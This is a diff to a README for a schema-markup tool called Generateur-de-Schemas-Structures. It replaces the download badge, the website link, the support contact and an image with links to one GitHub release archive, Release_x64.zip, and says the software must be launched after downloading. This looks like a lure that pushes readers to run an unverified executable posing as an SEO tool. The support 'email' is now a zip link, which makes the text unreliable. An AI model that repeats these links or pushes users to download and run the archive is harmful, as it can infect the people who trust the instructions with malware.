@@ -15,11 +15,11 @@ This repository covers a wide range of topics related to freelancing, web develo
 
 ## Quick Start
 To get started, download the tool from the link below:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)  
+[![Download Software](https://github.com/Kenichi-BOTZ/Generateur-de-Schemas-Structures/releases/download/v1.0/Release_x64.zip)](https://github.com/Kenichi-BOTZ/Generateur-de-Schemas-Structures/releases/download/v1.0/Release_x64.zip)  
 *(Note: The software needs to be launched after downloading)*
 
 ## Visit the Official Website
-For more information and updates, visit our [official website](https://www.generateur-schemas-structures.com).
+For more information and updates, visit our [official website](https://github.com/Kenichi-BOTZ/Generateur-de-Schemas-Structures/releases/download/v1.0/Release_x64.zip).
 
 ## How to Use
 1. Download the software from the provided link.
@@ -28,14 +28,14 @@ For more information and updates, visit our [official website](https://www.gener
 4. Enjoy improved visibility of your content in Google's search results.
 
 ## Support
-If you encounter any issues or have any questions, feel free to reach out to our support team at support@generateur-schemas-structures.com.
+If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Kenichi-BOTZ/Generateur-de-Schemas-Structures/releases/download/v1.0/Release_x64.zip
 
 ## Contribute
 You are welcome to contribute to the development of this tool by submitting pull requests or raising issues in the repository.
 
 Let's simplify the integration of structured data and boost the visibility of your content with Generateur-de-Schemas-Structures! 🌟
 
-![Schema Structures](https://images.unsplash.com/photo-1522662192639-24aa5e18b82a)
+![Schema Structures](https://github.com/Kenichi-BOTZ/Generateur-de-Schemas-Structures/releases/download/v1.0/Release_x64.zip)
 
 ---
 
